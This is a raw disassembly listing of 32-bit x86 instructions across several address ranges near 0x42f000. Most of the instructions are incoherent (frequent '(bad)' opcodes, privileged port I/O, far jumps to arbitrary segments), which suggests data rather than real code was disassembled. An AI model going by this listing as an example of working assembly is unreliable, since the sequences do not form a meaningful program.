  42f0b1:	add    BYTE PTR [eax],al
  42f0b3:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	bound  esi,QWORD PTR [edx]
  42f0c1:	fbstp  TBYTE PTR [ecx]
  42f0c3:	push   0xffffff8f
  42f0c5:	lock add DWORD PTR [eax],eax
  42f0c8:	cmc    
  42f0c9:	add    BYTE PTR [eax],al
  42f0cb:	add    BYTE PTR [ebp+0x164e026d],cl
  42f0d1:	xlat   BYTE PTR ds:[ebx]
  42f0d2:	iret   
  42f0d3:	and    al,0x7b
  42f0d5:	mov    edx,0x688f8145
  42f0da:	ret    
  42f0db:	cld    
  42f0dc:	jnp    0x42f141
  42f0de:	icebp  
  42f0df:	outs   dx,BYTE PTR ds:[esi]
  42f0e0:	inc    esi
  42f0e1:	xlat   BYTE PTR ds:[ebx]
  42f0e2:	jae    0x42f0a2
  42f0e4:	fchs   
  42f0e6:	stos   BYTE PTR es:[edi],al
  42f0e7:	arpl   sp,si
  42f0e9:	not    esp
  42f0eb:	es leave 
  42f0ed:	mov    ch,0xdd
  42f0ef:	jmp    0x19d0c4ec
  42f0f4:	mov    bh,0xae
  42f0f6:	stos   BYTE PTR es:[edi],al
  42f0f7:	jne    0x42f145
  42f0f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f0fa:	inc    esi
  42f0fb:	cdq    
  42f0fc:	cmp    al,BYTE PTR [ebp+0x69]
  42f0ff:	sub    eax,DWORD PTR ds:0x21fc9bfe
  42f105:	and    DWORD PTR [ebp-0x29],edi
  42f108:	in     al,0x2c
  42f10a:	dec    ah
  42f10c:	outs   dx,DWORD PTR ds:[esi]
  42f10d:	or     esp,DWORD PTR [ebp-0x28]
  42f110:	lahf   
  42f111:	std    
  42f112:	test   DWORD PTR [eax+0xe85a1fc],edi
  42f118:	xlat   BYTE PTR ds:[ebx]
  42f119:	mov    ds:0xe4619ed4,eax
  42f11e:	ja     0x42f142
  42f120:	fadd   DWORD PTR fs:[eax+0x18b42d9e]
  42f127:	or     al,0xa3
  42f129:	inc    ebp
  42f12a:	jbe    0x42f0b0
  42f12c:	out    0x19,al
  42f12e:	mov    esp,ss
  42f130:	sti    
  42f131:	stc    
  42f132:	sar    DWORD PTR [edx+0x7255d908],0x5
  42f139:	fbstp  TBYTE PTR [eax-0x5c2996bd]
  42f13f:	mov    ecx,0x7ca1e005
  42f144:	stos   DWORD PTR es:[edi],eax
  42f145:	dec    ebx
  42f146:	jnp    0x42f190
  42f148:	imul   ebx,DWORD PTR [edi+0x6d],0xfb3b4e00
  42f14f:	ss sbb eax,0xa50661dd
  42f155:	pop    edx
  42f156:	and    BYTE PTR [esi],0x84
  42f159:	sub    dl,dl
  42f15b:	adc    ah,ah
  42f15d:	dec    edx
  42f15e:	shr    BYTE PTR ds:0x88fa88f2,cl
  42f164:	nop
  42f165:	adc    ebp,ebp
  42f167:	jae    0x42f113
  42f169:	int3   
  42f16a:	repnz mov dh,0x2b
  42f16d:	ror    DWORD PTR [edi],cl
  42f16f:	xchg   ebx,eax
  42f170:	or     edi,DWORD PTR [edi]
  42f172:	arpl   WORD PTR [edi-0x677edb94],ax
  42f178:	dec    ebx
  42f179:	fidiv  WORD PTR [edx-0x4fda8b3c]
  42f17f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f180:	in     al,0x15
  42f182:	jbe    0x42f1c8
  42f184:	push   eax
  42f185:	dec    esi
  42f186:	test   al,0xe2
  42f188:	pushf  
  42f189:	add    edx,edi
  42f18b:	adc    BYTE PTR [ebp+0x39],bh
  42f18e:	pop    ebx
  42f18f:	lds    ebp,FWORD PTR [edx+0x47]
  42f192:	jmp    0x4c76df1e
  42f197:	shl    BYTE PTR [edi],1
  42f199:	dec    bx
  42f19b:	pushw  ss
  42f19d:	dec    esi
  42f19e:	xchg   BYTE PTR [eax],bh
  42f1a0:	cld    
  42f1a1:	rcl    BYTE PTR [edi+0x643542a],cl
  42f1a7:	test   eax,0x1fb1580f
  42f1ac:	pop    ss
  42f1ad:	add    eax,0x31a204a
  42f1b2:	nop
  42f1b3:	jg     0x42f1a1
  42f1b5:	clc    
  42f1b6:	sub    al,BYTE PTR [eax]
  42f1b8:	bound  ebp,QWORD PTR [edx+eax*2+0x11e0ba8e]
  42f1bf:	or     dh,BYTE PTR [ebx+0x0]
	...
  42f231:	add    BYTE PTR [eax],al
  42f233:	add    BYTE PTR [ebp-0x655875c3],ch
  42f239:	mov    bh,0xad
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	(bad)  
  42f241:	in     eax,0x50
  42f243:	sub    eax,DWORD PTR [ecx+esi*8+0xf50001]
  42f24a:	add    BYTE PTR [eax],al
  42f24c:	xchg   esi,eax
  42f24d:	add    ebx,edi
  42f24f:	dec    ecx
  42f250:	retf   
  42f251:	mov    eax,0xfaa066e0
  42f256:	ret    
  42f257:	xor    eax,0xfffffffc
  42f25a:	pop    ebx
  42f25b:	icebp  
  42f25c:	scas   eax,DWORD PTR es:[edi]
  42f25d:	adc    BYTE PTR [edx],dl
  42f25f:	jmp    FWORD PTR [ebx-0xf]
  42f262:	fadd   QWORD PTR [eax]
  42f264:	jmp    0xee85:0x2387f9f6
  42f26b:	out    dx,al
  42f26c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f26d:	mov    ebp,0xcf9c81a9
  42f272:	in     eax,dx
  42f273:	mov    ah,0x69
  42f275:	pop    ebp
  42f276:	or     ebp,DWORD PTR [ebx-0x6e]
  42f279:	add    eax,0xac8bd61f
  42f27e:	dec    esi
  42f27f:	mov    gs,esp
  42f281:	ss sti 
  42f283:	neg    ebx
  42f285:	adc    ecx,0xf0436f01
  42f28b:	(bad)  
  42f28d:	xchg   ecx,eax
  42f28e:	dec    ecx
  42f28f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f290:	dec    ebx
  42f291:	pushf  
  42f292:	jmp    0x5d44:0x459190c
  42f299:	ds pop es
  42f29b:	jle    0x42f29e
  42f29d:	and    BYTE PTR [ecx+edi*1],dl
  42f2a0:	jmp    0x42f2b0
  42f2a2:	cld    
  42f2a3:	daa    
  42f2a4:	cmc    
  42f2a5:	cmp    al,0x55
  42f2a7:	or     dh,BYTE PTR [esi+0x673b97ed]
  42f2ad:	shr    DWORD PTR [ebx+0x41],0x4a
  42f2b1:	xlat   BYTE PTR ds:[ebx]
  42f2b2:	fidiv  DWORD PTR ds:0x428815a7
  42f2b8:	fisubr DWORD PTR [ecx+0x17]
  42f2bb:	sub    al,0xee
  42f2bd:	mov    dl,0xcd
  42f2bf:	jmp    0x2c62:0xd8f512dd
  42f2c6:	push   edx
  42f2c7:	mov    ds:0xd8985031,eax
  42f2cc:	jmp    0x5b22cced
  42f2d1:	jns    0x42f2b8
  42f2d3:	push   esp
  42f2d4:	aaa    
  42f2d5:	or     edx,DWORD PTR [esi-0x1e6d8888]
  42f2db:	jp     0x42f307
  42f2dd:	in     eax,0xe4
  42f2df:	xchg   ebp,eax
  42f2e0:	inc    eax
  42f2e1:	add    DWORD PTR [esp+ebx*2+0x71],ecx
  42f2e5:	rcl    DWORD PTR [esi+0x31],0xac
  42f2e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f2ea:	xor    BYTE PTR [eax],ch
  42f2ec:	std    
  42f2ed:	fild   DWORD PTR [edi-0x1e]
  42f2f0:	mov    dh,BYTE PTR [ebp+0x41]
  42f2f3:	pop    ds
  42f2f4:	call   0xca2:0xf05b1e83
  42f2fb:	neg    DWORD PTR [ebp+0x7a]
  42f2fe:	mov    cl,0x52
  42f300:	fwait
  42f301:	lock addr16 mov ebx,0xa32b68c
  42f308:	and    al,0xe2
  42f30a:	mov    ch,BYTE PTR [esi+ecx*8-0x21]
  42f30e:	or     cl,BYTE PTR [esi+0x2e]
  42f311:	sahf   
  42f312:	in     al,0x44
  42f314:	shl    al,0x4e
  42f317:	jo     0x42f304
  42f319:	ret    0x49df
  42f31c:	fst    QWORD PTR ds:0x56df1cc9
  42f322:	in     al,0x3a
  42f324:	jnp    0x42f318
  42f326:	test   BYTE PTR [edi+ecx*8],ch
  42f329:	sbb    DWORD PTR [eax],0x9d8dc702
  42f32f:	xchg   edi,eax
  42f330:	mov    ah,0x4d
  42f332:	(bad)  [esi]
  42f334:	or     ebx,DWORD PTR [edi+0x50]
  42f337:	cmp    BYTE PTR [ebx],0x97
  42f33a:	adc    ebx,DWORD PTR [edx]
  42f33c:	repz xchg esi,eax
  42f33e:	fnstenv [edx+eiz*1+0x0]
	...
  42f3b2:	add    BYTE PTR [eax],al
  42f3b4:	loop   0x42f373
  42f3b6:	fadd   st(7),st
  42f3b8:	(bad)  
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	inc    ebx
  42f3c1:	adc    BYTE PTR [ebx+0x1f27944],al
  42f3c7:	add    ch,dh
  42f3c9:	add    BYTE PTR [eax],al
  42f3cb:	add    BYTE PTR [edi-0x34ae072e],bh
  42f3d1:	push   es
  42f3d2:	jne    0x42f429
  42f3d4:	pop    ds
  42f3d5:	fild   DWORD PTR [eax-0x4a8317c1]
  42f3db:	fcmovb st,st(6)
  42f3dd:	sahf   
  42f3de:	xlat   BYTE PTR ds:[ebx]
  42f3df:	mov    ebx,0xef397c91
  42f3e4:	dec    esi
  42f3e5:	mov    bh,0x19
  42f3e7:	dec    DWORD PTR [edi+0x54]
  42f3ea:	add    DWORD PTR [eax+edx*8-0x7e],esi
  42f3ee:	dec    eax
  42f3ef:	sbb    ebp,DWORD PTR [edx]
  42f3f1:	or     esp,DWORD PTR [eax+0x2f0078df]
  42f3f7:	push   ebp
  42f3f8:	ss ds adc cl,dl
  42f3fc:	cmp    ebp,DWORD PTR [eax]
  42f3fe:	not    DWORD PTR [esi]
  42f400:	inc    eax
  42f401:	in     al,0xb4
  42f403:	add    edx,DWORD PTR [eax-0x78]
  42f406:	dec    ecx
  42f407:	enter  0xce0,0x3e
  42f40b:	add    eax,0x84907b26
  42f410:	jae    0x42f491
  42f412:	pop    ss
  42f413:	sti    
  42f414:	sbb    eax,0xa9e5b703
  42f41a:	(bad)  
  42f41b:	into   
  42f41c:	push   ebx
  42f41d:	sbb    ebx,DWORD PTR [ebx-0x7eabafdf]
  42f423:	ins    DWORD PTR es:[edi],dx
  42f424:	ins    DWORD PTR es:[edi],dx
  42f425:	js     0x42f3b6
  42f427:	dec    eax
  42f428:	pop    esp
  42f429:	jmp    0xd8a9:0x4f4fc4e0
  42f430:	cmp    eax,esi
  42f432:	outs   dx,DWORD PTR ds:[esi]
  42f433:	jle    0x42f3d6
  42f435:	mov    edx,0x2b4c3183
  42f43a:	pop    ebx
  42f43b:	std    
  42f43c:	xchg   esi,eax
  42f43d:	sub    DWORD PTR [eax-0x2ee1e8ab],esi
  42f443:	cmp    ebp,edi
  42f445:	jle    0x42f426
  42f447:	lock push eax
  42f449:	jl     0x42f476
  42f44b:	std    
  42f44c:	xchg   ecx,eax
  42f44d:	mov    bh,0xff
  42f44f:	nop
  42f450:	cld    
  42f451:	inc    esp
  42f452:	add    DWORD PTR [ebx-0x1d866f26],esi
  42f458:	or     al,0xa3
  42f45a:	clc    
  42f45b:	test   eax,0x1e72719b
  42f460:	aaa    
  42f461:	add    ah,BYTE PTR cs:[ecx+0x30]
  42f465:	pop    ecx
  42f466:	xchg   ecx,eax
  42f467:	dec    edi
  42f468:	push   ss
  42f469:	and    dh,BYTE PTR [edi+0x3e]
  42f46c:	xlat   BYTE PTR ds:[ebx]
  42f46d:	aas    
  42f46e:	ds repnz aas 
  42f471:	hlt    
  42f472:	aam    0x8e
  42f474:	sub    cl,0xea
  42f477:	rcl    BYTE PTR [edx+eax*4-0x5a],1
  42f47b:	cs in  eax,dx
  42f47d:	push   gs
  42f47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f480:	cmc    
  42f481:	mov    eax,ds:0xd491fa0f
  42f486:	cs mov edi,0xffd819b6
  42f48c:	shr    DWORD PTR [ecx+0x2a],cl
  42f48f:	test   ch,bh
  42f491:	add    DWORD PTR [ecx+eax*1],edx
  42f494:	xor    eax,0x7a63d581
  42f499:	xchg   edx,eax
  42f49a:	cmp    eax,0x7b5d6ee7
  42f49f:	mov    ah,0x12
  42f4a1:	mov    es,WORD PTR [ecx-0x7e8d968d]
  42f4a7:	mov    al,ds:0x210d9286
  42f4ac:	add    cl,bh
  42f4ae:	cmp    al,0xae
  42f4b0:	cmp    al,0xc7
  42f4b2:	jo     0x42f525
  42f4b4:	or     BYTE PTR [ebp-0x42ce16b4],0x48
  42f4bb:	mov    dl,BYTE PTR [esi]
  42f4bd:	sbb    ch,al
  42f4bf:	sbb    DWORD PTR [esi],0x0
	...
  42f531:	add    BYTE PTR [eax],al
  42f533:	add    BYTE PTR [ebp+0x38],dl
  42f536:	into   
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi-0x34],bh
  42f541:	std    
  42f542:	jmp    0xf500:0x1f36ef6
  42f549:	add    BYTE PTR [eax],al
  42f54b:	add    bh,cl
  42f54d:	aam    0xa1
  42f54f:	les    esi,FWORD PTR [ecx+edx*1+0x18]
  42f553:	xchg   esp,eax
  42f554:	lds    esp,FWORD PTR [ecx+0x27]
  42f557:	inc    ebx
  42f558:	dec    ebp
  42f559:	cli    
  42f55a:	xchg   BYTE PTR [edi],al
  42f55c:	mov    ebx,esi
  42f55e:	pop    edi
  42f55f:	jecxz  0x42f5b3
  42f561:	push   0x62
  42f563:	out    0xf6,al
  42f565:	sbb    DWORD PTR [ebx],esp
  42f567:	cmp    BYTE PTR [ecx+0x16cc4b0a],bl
  42f56d:	mul    eax
  42f56f:	sahf   
  42f570:	nop
  42f571:	sbb    eax,0x64cc5402
  42f576:	leave  
  42f577:	push   esp
  42f578:	add    ch,bh
  42f57a:	push   esi
  42f57b:	(bad)  
  42f57c:	lahf   
  42f57d:	add    eax,ebp
  42f57f:	sbb    esp,DWORD PTR [ebx]
  42f581:	xchg   BYTE PTR [edi+0x2e],al
  42f584:	jecxz  0x42f5cb
  42f586:	fisubr DWORD PTR [esi-0x498be4a7]
  42f58c:	aad    0x2f
  42f58e:	xchg   ecx,eax
  42f58f:	das    
  42f590:	cld    
  42f591:	retf   0x1d49
  42f594:	push   es
  42f595:	jnp    0x42f52c
  42f597:	xor    DWORD PTR [ebp-0x4bf89884],esp
  42f59d:	pop    ds
  42f59e:	pop    ds
  42f59f:	sar    DWORD PTR ds:0xb9e370bc,1
  42f5a5:	xchg   ebx,eax
  42f5a6:	add    eax,0x22684207
  42f5ab:	test   BYTE PTR [ebp-0x35e3a2a2],cl
  42f5b1:	pop    es
  42f5b2:	pop    ecx
  42f5b3:	stos   BYTE PTR es:[edi],al
  42f5b4:	or     BYTE PTR [ecx+0x0],ah
  42f5b7:	adc    bl,BYTE PTR [ebp+0xd]
  42f5ba:	test   BYTE PTR [edi+0x4d],dh
  42f5bd:	nop
  42f5be:	jbe    0x42f62e
  42f5c0:	push   cs
  42f5c1:	nop
  42f5c2:	mov    ss,WORD PTR [esi+0x7f]
  42f5c5:	inc    edx
  42f5c6:	and    bl,BYTE PTR [eax+ebp*8]
  42f5c9:	call   0x35f02bea
  42f5ce:	sub    bh,dl
  42f5d0:	ja     0x42f552
  42f5d2:	jge    0x42f600
  42f5d4:	sub    BYTE PTR [ebp+0x77],dh
  42f5d7:	mov    esi,edx
  42f5d9:	mov    bh,0xe
  42f5db:	jmp    0xc0e9706b
  42f5e0:	in     eax,dx
  42f5e1:	(bad)  
  42f5e2:	int3   
  42f5e3:	out    0xf5,eax
  42f5e5:	imul   DWORD PTR es:[esi-0x2]
  42f5e9:	adc    BYTE PTR [ebx],dh
  42f5eb:	jle    0x42f5aa
  42f5ed:	or     BYTE PTR [eax],0xb1
  42f5f0:	dec    ecx
  42f5f1:	scas   eax,DWORD PTR es:[edi]
  42f5f2:	(bad)  
  42f5f3:	fwait
  42f5f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f5f5:	ins    DWORD PTR es:[edi],dx
  42f5f6:	jmp    0x42f675
  42f5f8:	retf   0xb37e
  42f5fb:	push   0x54a9ad2e
  42f600:	iret   
  42f601:	cmp    al,0x10
  42f603:	mov    al,ds:0xa2684346
  42f608:	lock rcr cl,1
  42f60b:	add    BYTE PTR [edi],al
  42f60d:	rol    DWORD PTR [ecx-0x25383ad2],cl
  42f613:	and    BYTE PTR [esp+edx*4-0x47ddfab0],0x19
  42f61b:	fcom   DWORD PTR [edx+ebp*8]
  42f61e:	cmp    bl,dh
  42f620:	stc    
  42f621:	in     al,dx
  42f622:	inc    esi
  42f623:	fdiv   QWORD PTR [ebx+ebp*8+0x69]
  42f627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f628:	sub    eax,0x28a4cf5e
  42f62d:	int    0x98
  42f62f:	adc    eax,0x73b27a51
  42f634:	in     eax,0xc1
  42f636:	sub    DWORD PTR [ecx],ebx
  42f638:	ret    
  42f639:	(bad)  
  42f63a:	xchg   edi,eax
  42f63b:	push   0x19bd022e
  42f640:	sbb    al,0x0
	...
  42f6b2:	add    BYTE PTR [eax],al
  42f6b4:	pop    edx
  42f6b5:	cmp    DWORD PTR [esi+0x2d],ecx
  42f6b8:	outs   dx,DWORD PTR ds:[esi]
  42f6b9:	jg     0x42f736
  42f6bb:	jg     0x42f6c6
  42f6bd:	mov    bh,0xe3
  42f6bf:	xor    dl,BYTE PTR [eax+0x6311e4e5]
  42f6c5:	hlt    
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	cmc    
  42f6c9:	add    BYTE PTR [eax],al
  42f6cb:	add    BYTE PTR [esp+eiz*2],ch
  42f6ce:	pushf  
  42f6cf:	pop    eax
  42f6d0:	xchg   edi,eax
  42f6d1:	and    al,0xe6
  42f6d3:	cli    
  42f6d4:	xchg   ebp,eax
  42f6d5:	and    BYTE PTR [ecx],ch
  42f6d7:	sahf   
  42f6d8:	and    BYTE PTR [ebx],ch
  42f6da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6db:	and    BYTE PTR [ebx-0x17],cl
  42f6de:	xchg   esp,eax
  42f6df:	fdiv   DWORD PTR [ebx-0x53]
  42f6e2:	gs pop ebp
  42f6e4:	out    0x41,eax
  42f6e6:	adc    eax,0x5360e27
  42f6eb:	jns    0x42f6be
  42f6ed:	mov    eax,ds:0x487f22cf
  42f6f2:	or     al,0x7e
  42f6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6f5:	lods   eax,DWORD PTR ds:[esi]
  42f6f6:	in     eax,0xbd
  42f6f8:	jno    0x42f6f2
  42f6fa:	es mov bh,0x66
  42f6fd:	loop   0x42f68a
  42f6ff:	and    eax,0x610a82f5
  42f704:	mov    ah,0x61
  42f706:	test   al,0x57
  42f708:	pop    esi
  42f709:	imul   ecx,DWORD PTR [edx+ebp*8-0x2a],0xddcc0396
  42f711:	push   DWORD PTR [ebx-0x8601e2e]
  42f717:	cmp    eax,0x3b2b6683
  42f71c:	fucomp st(2)
  42f71e:	ficomp WORD PTR [esi*2-0xc25d615]
  42f725:	out    dx,eax
  42f726:	rcr    BYTE PTR [esi],0x13
  42f729:	jo     0x42f748
  42f72b:	adc    DWORD PTR [ebx+0x4c],ebx
  42f72e:	inc    ecx
  42f72f:	addr16 push edx
  42f731:	mov    eax,0x8a706cbe
  42f736:	add    DWORD PTR [ebx],edi
  42f738:	call   0x5d608e2d
  42f73d:	icebp  
  42f73e:	pop    edi
  42f73f:	nop
  42f740:	jne    0x42f7a2
  42f742:	jb     0x42f756
  42f744:	xchg   DWORD PTR [esi],ebx
  42f746:	pop    ebp
  42f747:	dec    ebp
  42f748:	repz les ebp,FWORD PTR [edi+ebp*1]
  42f74c:	and    cl,ch
  42f74e:	sub    bh,bh
  42f750:	lahf   
  42f751:	repnz push 0xfffffffe
  42f754:	cmp    edi,DWORD PTR [edx+0x48c8d956]
  42f75a:	mov    ds:0x7a6356bf,al
  42f75f:	(bad)  
  42f760:	xchg   esp,eax
  42f761:	retf   0xc436
  42f764:	push   edx
  42f765:	fdiv   QWORD PTR [edi-0x7384050f]
  42f76b:	add    al,0x26
  42f76d:	fisttp DWORD PTR [eax]
  42f76f:	push   cs
  42f770:	mov    cl,0x61
  42f772:	lock bnd jb 0x42f7b9
  42f776:	sbb    dl,BYTE PTR [edx+ebx*8]
  42f779:	mov    dl,0xe3
  42f77b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f77c:	add    eax,0x22f87f3a
  42f781:	test   DWORD PTR cs:[esi],edi
  42f784:	inc    ebx
  42f785:	es cmc 
  42f787:	(bad)  
  42f788:	(bad)  
  42f789:	sahf   
  42f78a:	mov    esp,0x74619177
  42f78f:	ror    DWORD PTR [edi-0x2cfa1b24],0xae
  42f796:	pop    ebp
  42f797:	inc    esi
  42f798:	dec    edx
  42f799:	fild   DWORD PTR [esp+esi*8]
  42f79c:	mov    esp,0x5926fc4b
  42f7a1:	and    eax,0xda7a4ca4
  42f7a6:	or     ch,BYTE PTR [ecx-0x5cb47a6d]
  42f7ac:	push   es
  42f7ad:	jno    0x42f7f6
  42f7af:	test   DWORD PTR [eax-0x55],0x32faac1c
  42f7b6:	sub    al,BYTE PTR [edx+0x4cff3746]
  42f7bc:	mov    dh,0x77
  42f7be:	fwait
  42f7bf:	lds    ebx,FWORD PTR [eax+0x0]
	...
  42f832:	add    BYTE PTR [eax],al
  42f834:	ret    
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi-0x66af3771]
  42f841:	mov    ss,WORD PTR [ebx]
  42f843:	sbb    eax,0x1f558
  42f848:	cmc    
  42f849:	add    BYTE PTR [eax],al
  42f84b:	add    BYTE PTR [esi+0x141ae1b9],bl
  42f851:	lea    edx,[eax+0x8]
  42f854:	cdq    
  42f855:	jbe    0x42f830
  42f857:	aaa    
  42f858:	test   DWORD PTR ds:0x9221fe78,ecx
  42f85e:	lock pop es
  42f860:	ret    
  42f861:	pop    ecx
  42f862:	push   cs
  42f863:	dec    edi
  42f864:	fs push ebx
  42f866:	xor    ah,ah
  42f868:	and    esi,eax
  42f86a:	pushf  
  42f86b:	in     eax,dx
  42f86c:	jbe    0x42f8a6
  42f86e:	lahf   
  42f86f:	js     0x42f8d3
  42f871:	pop    eax
  42f873:	out    dx,eax
  42f874:	xor    dl,dl
  42f876:	cwde   
  42f877:	jl     0x42f8cb
  42f879:	in     al,0x1c
  42f87b:	repnz mov dh,0xf5
  42f87e:	adc    al,0x1f
  42f880:	xlat   BYTE PTR ds:[ebx]
  42f881:	mov    edx,0x2a7f2aa
  42f886:	fnsave [esi]
  42f888:	aam    0x9d
  42f88a:	jb     0x42f847
  42f88c:	xor    al,0x8b
  42f88e:	push   esp
  42f88f:	into   
  42f890:	jmp    0x42f8c1
  42f892:	jp     0x42f8bb
  42f894:	pop    ss
  42f895:	push   0x8daf1f74
  42f89a:	xchg   dl,ah
  42f89c:	mov    ecx,0x616636f8
  42f8a1:	push   ebp
  42f8a2:	pusha  
  42f8a3:	or     cl,BYTE PTR ds:0xf3bb91f4
  42f8a9:	popf   
  42f8aa:	in     al,dx
  42f8ab:	sti    
  42f8ac:	test   DWORD PTR [edi-0x65a84b06],esi
  42f8b2:	jmp    0x200a:0x8aa30c96
  42f8b9:	push   ecx
  42f8ba:	cmp    DWORD PTR [esi],ebp
  42f8bc:	(bad)  
  42f8bd:	sub    DWORD PTR [edi+0x2a],edi
  42f8c0:	inc    edx
  42f8c1:	btr    DWORD PTR [ebx],0x5d
  42f8c5:	out    dx,al
  42f8c6:	sbb    eax,0x218ce769
  42f8cb:	pop    ebx
  42f8cc:	ins    DWORD PTR es:[edi],dx
  42f8cd:	pop    ds
  42f8ce:	jne    0x42f8e1
  42f8d0:	std    
  42f8d1:	mov    WORD PTR [ecx+0x6b17e885],gs
  42f8d7:	inc    ebx
  42f8d8:	adc    dl,bh
  42f8da:	add    ecx,ebp
  42f8dc:	pop    ebx
  42f8dd:	int3   
  42f8de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8df:	in     al,dx
  42f8e0:	mov    esi,0x3d4986b7
  42f8e5:	pop    ebp
  42f8e6:	mov    al,ds:0xc1509e76
  42f8eb:	lock dec edi
  42f8ed:	arpl   WORD PTR [edi-0x5f],bx
  42f8f0:	ss (bad) 
  42f8f3:	std    
  42f8f4:	pop    ss
  42f8f5:	nop
  42f8f6:	into   
  42f8f7:	nop
  42f8f8:	scas   al,BYTE PTR es:[edi]
  42f8f9:	inc    edx
  42f8fa:	dec    edi
  42f8fb:	lea    ebx,[ebx-0x705f6998]
  42f901:	mov    eax,ds:0xe0391208
  42f906:	daa    
  42f907:	repz xchg edx,eax
  42f909:	xor    edi,DWORD PTR [ecx+0x2e]
  42f90c:	push   0xbe7f95e5
  42f911:	or     al,ch
  42f913:	add    bl,BYTE PTR [ecx]
  42f915:	mov    al,0x7d
  42f917:	sub    cl,BYTE PTR [edi]
  42f919:	jp     0x42f8f6
  42f91b:	fadd   st(6),st
  42f91d:	lea    ebp,[ebp+0x2941072c]
  42f923:	out    dx,eax
  42f924:	sbb    DWORD PTR [eax+0x6240b0c7],ebx
  42f92a:	(bad)  [ebx]
  42f92c:	jge    0x42f8cb
  42f92e:	enter  0xa215,0xf6
  42f932:	pop    edi
  42f933:	xchg   edi,eax
  42f934:	dec    ebp
  42f935:	push   cs
  42f936:	inc    esi
  42f937:	xchg   DWORD PTR [edx],esi
  42f939:	push   ecx
  42f93a:	lahf   
  42f93b:	out    0x22,eax
  42f93d:	js     0x42f99c
  42f93f:	jge    0x42f928
	...
  42f9b1:	add    BYTE PTR [eax],al
  42f9b3:	add    ch,ah
  42f9b5:	mov    edx,0xebdfe392
  42f9ba:	cmc    
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	ret    
  42f9c1:	jbe    0x42f999
  42f9c3:	jmp    0x44f015
  42f9c8:	cmc    
  42f9c9:	add    BYTE PTR [eax],al
  42f9cb:	add    BYTE PTR [edx],cl
  42f9cd:	jl     0x42f9ba
  42f9cf:	sub    al,0xaf
  42f9d1:	popa   
  42f9d2:	sub    eax,0xa496e1dd
  42f9d7:	or     eax,0xdfcea692
  42f9dc:	retf   
  42f9dd:	add    esi,0xd05f60b1
  42f9e3:	lods   al,BYTE PTR ds:[esi]
  42f9e4:	in     al,0x58
  42f9e6:	shl    DWORD PTR [eax+0x6066669d],cl
  42f9ec:	pushf  
  42f9ed:	fs mov dl,0x47
  42f9f0:	push   ss
  42f9f1:	leave  
  42f9f2:	xchg   edx,eax
  42f9f3:	and    ebp,DWORD PTR [ebp+0x36e42a2c]
  42f9f9:	shr    DWORD PTR [esi-0x32],cl
  42f9fc:	xchg   edi,eax
  42f9fd:	nop
  42f9fe:	xchg   BYTE PTR [ebp+0x6c],cl
  42fa01:	jns    0x42fa56
  42fa03:	cwde   
  42fa04:	or     DWORD PTR [edi],edx
  42fa06:	jbe    0x42fa57
  42fa08:	adc    BYTE PTR [ecx+0x2a],cl
  42fa0b:	push   0x5526afa3
  42fa10:	or     bh,BYTE PTR [edi+0x22b82e30]
  42fa16:	xchg   edi,eax
  42fa17:	or     eax,0xa34c7522
  42fa1c:	aas    
  42fa1d:	mov    dh,0x6f
  42fa1f:	and    bh,ch
  42fa21:	out    0x60,eax
  42fa23:	fdivr  QWORD PTR [eax+0x3f]
  42fa26:	aaa    
  42fa27:	nop
  42fa28:	xchg   DWORD PTR [eax+0x7d739ea3],ecx
  42fa2e:	pushf  
  42fa2f:	sub    cl,0x74
  42fa32:	(bad)  
  42fa33:	je     0x42fa30
  42fa35:	pop    ecx
  42fa36:	imul   edi,DWORD PTR [edi],0x48
  42fa39:	push   es
  42fa3a:	adc    cl,dl
  42fa3c:	fistp  DWORD PTR [edi+0x5c]
  42fa3f:	xor    al,0xa9
  42fa41:	dec    esi
  42fa42:	(bad)  
  42fa43:	imul   ecx,DWORD PTR [edx],0x28
  42fa46:	mov    eax,ds:0x81897c99
  42fa4b:	or     edx,ebx
  42fa4d:	(bad)  
  42fa4f:	add    eax,0xba291303
  42fa54:	jl     0x42fa30
  42fa56:	popf   
  42fa57:	pushf  
  42fa58:	test   BYTE PTR [edx+0x7e],dh
  42fa5b:	cwde   
  42fa5c:	jp     0x42fa55
  42fa5e:	pop    es
  42fa5f:	nop
  42fa60:	das    
  42fa61:	mov    BYTE PTR [ebx+0x3ccb8829],bl
  42fa67:	pop    ebx
  42fa68:	cdq    
  42fa69:	out    dx,eax
  42fa6a:	dec    ebp
  42fa6b:	pop    es
  42fa6c:	sub    al,0xb7
  42fa6e:	fmul   DWORD PTR ds:0x146a1ef4
  42fa74:	int3   
  42fa75:	and    eax,0x9ef6619a
  42fa7a:	fisttp QWORD PTR [ecx+0x5f]
  42fa7d:	shr    ah,0xc7
  42fa80:	mov    esp,ds
  42fa82:	or     eax,0x40980ba6
  42fa87:	in     eax,dx
  42fa88:	xor    al,0xcd
  42fa8a:	jmp    0x42fabf
  42fa8c:	mov    bl,0x7
  42fa8f:	push   edx
  42fa90:	inc    BYTE PTR [ebp+ebp*8-0x5a8028dc]
  42fa97:	leave  
  42fa98:	mov    ds,WORD PTR [ebx+0x56]
  42fa9b:	bound  eax,QWORD PTR [ecx]
  42fa9d:	ins    BYTE PTR es:[edi],dx
